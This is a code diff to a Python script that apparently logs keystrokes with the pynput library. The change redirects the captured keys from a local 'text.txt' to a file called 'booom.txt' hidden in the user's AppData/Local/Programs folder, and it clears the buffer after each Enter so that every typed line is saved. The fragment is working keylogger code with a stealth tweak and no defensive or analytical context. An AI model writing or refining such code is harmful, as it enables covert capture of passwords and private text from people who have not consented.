@@ -2,8 +2,7 @@ import pynput.keyboard as Keyboard
 import os
 
 ky = ""
-f = open("text.txt", "w")
-
+f = open("C:/Users/"+os.getlogin()+"/AppData/Local/Programs/booom.txt", "w")
 
 def numpad(num):
     switch = {
@@ -45,10 +44,12 @@ def on_press(key):
             ky = ky + f'{key.char}'
             if key == Keyboard.Key.enter:
                 f.write(ky)
+                ky = ""
     except AttributeError:
         ky =  ky + scase(key)
         if key == Keyboard.Key.enter:
             f.write(ky)
+            ky = ""
     print(ky)
 
 def on_release(key):
